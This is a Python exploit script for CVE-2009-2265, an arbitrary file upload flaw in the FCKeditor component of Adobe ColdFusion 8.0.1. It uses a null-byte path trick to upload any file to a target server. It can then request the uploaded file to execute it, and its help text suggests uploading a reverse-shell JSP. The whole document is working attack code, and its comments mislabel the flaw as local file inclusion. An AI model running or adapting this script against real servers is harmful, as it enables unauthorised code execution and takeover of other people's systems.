#!/usr/bin/env python3
# exploit title: cf8-upload.py
# author: p1ckzi
#         github: https://github.com/p1ckzi
#         twitter: @p1ckzi
# vendor home: https://www.adobe.com
# vulnerable software and version: Adobe ColdFusion 8.0.1
# tested on: Windows Server 2008 | Adobe ColdFusion 8.0.1
# cve: 2009-2265
#
# description:
# the script exploits a vulnerability found in FCKeditor < 2.6.4.1 which was
# implemented into adobe coldfusion 8.0.1:
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2265
# the script allows the  user to submit a file to upload to a target computer
# running coldfusion 8.0.1 and execute it.

import argparse
import os
import sys
import requests
import errno


def arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{sys.argv[0]} exploits an LFI vulnerability in"
        "\nadobe coldfusion 8.0.1",
        epilog=f"examples:"
        f"\n\t{sys.argv[0]} 10.10.10.10 file.txt"
        f"\n\t{sys.argv[0]} 10.10.10.10:8500 /path/to/reverse-shell.jsp -r"
        f"\n\t{sys.argv[0]} hostname:8500/sub-dir /path/to/upload.zip -n"
    )
    parser.add_argument("address", help="ip/hostname, port, sub-directories"
                        " to the adobe coldfusion 8.0.1 server")
    parser.add_argument("path", help="path to file you wish to upload"
                        " (eg. '/path/to/file.txt')")
    parser.add_argument("-a", "--accessible", help="turns off features"
                        " which may negatively affect screen readers",
                        action="store_true", default=False)
    parser.add_argument("-n", "--no-colour", help="removes colour output",
                        action="store_true", default=False)
    parser.add_argument("-r", "--request", help="request webpage after"
                        " successfully uploading file",
                        action="store_true", default=False)
    arguments.option = parser.parse_args()


# settings for terminal output defined by user in term_settings().
class settings():
    # colours.
    c0 = ""
    c1 = ""
    c2 = ""
    c3 = ""
    c4 = ""
    c5 = ""
    c6 = ""
    c7 = ""

    # information boxes.
    i1 = ""
    i2 = ""
    i3 = ""


# checks for terminal setting flags supplied by arguments().
def term_settings():
    if arguments.option.accessible:
        small_banner()
    elif arguments.option.no_colour:
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        banner()
    elif not arguments.option.accessible or arguments.option.no_colour:
        settings.c0 = "\u001b[0m"  # reset.
        settings.c1 = "\u001b[38;5;33m"  # dark blue.
        settings.c2 = "\u001b[38;5;14m"  # royal blue.
        settings.c3 = "\u001b[38;5;111m"  # marine blue.
        settings.c4 = "\u001b[38;5;15m"  # grey.
        settings.c5 = "\u001b[38;5;1m"   # red.
        settings.c6 = "\u001b[38;5;2m"   # green.
        settings.c7 = "\u001b[38;5;3m"   # yellow.
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        banner()
    else:
        print("something went horribly wrong!")
        sys.exit()


# default terminal banner.
def banner():
    print(
        f"{settings.c1}       __  ___                   _                _"
        f"\n  __  / _|( _ ) ___  _  _  _ __ | | ___  __ _  __| |    _ __  _  _"
        f"\n{settings.c2} / _||  _|/ _ \\|___|| || || '_ \\| |/ _ \\/ _` |/ _`"
        " | _ | '_ \\| || |"
        f"\n{settings.c3} \\__||_|  \\___/      \\_,_|| .__/|_|\\___/\\__,_|\\"
        "__,_|(_)| .__/ \\_, |"
        f"\n{settings.c4}                          |_|                        "
        f"  |_|    |__/ {settings.c0}"
        f"\n{settings.i3}CVE-2009-2265."
    )


def small_banner():
    print(
        f"{sys.argv[0]}"
        "\nCVE-2009-2265."
    )


def read_file(address, path):
    try:
        with open(path, "r") as payload:
            read_file.contents = payload.read()
            read_file.url = f"http://{address}"

    except FileNotFoundError:
        print(
            f"{settings.c5}{settings.i2}the file could not be found."
            f"\n{settings.i2}please check path and filename are correct.\n\
            {settings.c0}"
        )
        sys.exit()


# Uploads the file to ColdFusion 8.0.1 server via LFI vulnerability.
def exploit(url, contents):
    exploit.filename = os.path.basename(arguments.option.path)
    print(f"{settings.i3}sending file as '{exploit.filename}' to {url}.")
    try:
        upload = requests.post(
            url + "/CFIDE/scripts/ajax/FCKeditor"
            "/editor/filemanager/connectors/cfm/upload.cfm?Command="
            f"FileUpload&Type=File&CurrentFolder=/{exploit.filename}%00",
            files={
                "newfile": (
                    f"{exploit.filename}.txt",
                    contents,
                    "application/x-java-archive",
                )
            },
            timeout=30,
        )
        if upload.status_code == 200:
            print(
                f"{settings.c6}{settings.i1}successfully uploaded '"
                f"{exploit.filename}'.{settings.c0}"
            )

            if arguments.option.request:
                web_request()
            else:
                print(
                    f"{settings.c6}{settings.i1}location: " +
                    url +
                    f"/userfiles/file/{exploit.filename}\n{settings.c0}"
                )
                sys.exit()

        else:
            print(
                f"{settings.c5}{settings.i2}failed to upload '"
                f"{exploit.filename}'.{settings.c0}"
                f"\n{settings.i3}use {sys.argv[0]} -h | --help for usage and"
                " examples."
            )

    # incase connection is refused.
    except requests.ConnectionError:
        print(
            f"{settings.c5}{settings.i2}could not connect to {url}."
            f"\n{settings.c5}{settings.i2}please make sure ip/hostname and "
            f"port, etc are correct.{settings.c0}"
            f"\n{settings.i3}use {sys.argv[0]} -h | --help for usage and"
            " examples."
        )

    # timeout is 30 seconds by default but can be extended is server is slow.
    except requests.Timeout:
        print(
            f"{settings.c5}{settings.i2}failed to upload '"
            f"{exploit. filename}'."
            f"\n{settings.i2}the request timed out.\n{settings.c0}"
        )

    except KeyboardInterrupt:
        print(f"{settings.i3}quiting.")


# triggers after exploit() and only if user uses -r or --request argument.
# useful if the user has uploaded a reverse shell and saves having to manually
# request the webpage themselves.
def web_request():
    file_url = read_file.url + f"/userfiles/file/{exploit.filename}"
    print(
            f"{settings.i3}requesting the file..."
        )
    try:
        file_contents = requests.get(file_url, timeout=30)
        if file_contents.status_code == 200:
            print(
                f"{settings.c6}{settings.i1}successfully requested:'"
                f"\n{settings.c6}{settings.i1}{file_url}'.{settings.c0}"
            )
        else:
            print(f"{settings.i3}something went wrong.")

    # in case there is a failure in getting the uploaded file.
    except requests.ConnectionError:
        print(
            f"{settings.i3}could not make a get request to the uploaded file."
            f"\n{settings.i3}try visiting: {file_url}."
        )

    # timeout is 30 seconds by default but can be extended is server is slow.
    except requests.Timeout:
        print(
            f"{settings.i3}timed out while requesting the uploaded file."
            f"\n{settings.i3}try visiting: {file_url}."
        )

    except KeyboardInterrupt:
        print(
            f"{settings.i3}get request cancelled."
            f"\n{settings.i3}visit {file_url} for file."
        )


def main():
    arguments()
    term_settings()
    read_file(
        arguments.option.address,
        arguments.option.path
    )
    exploit(read_file.url, read_file.contents)


if __name__ == "__main__":
    main()
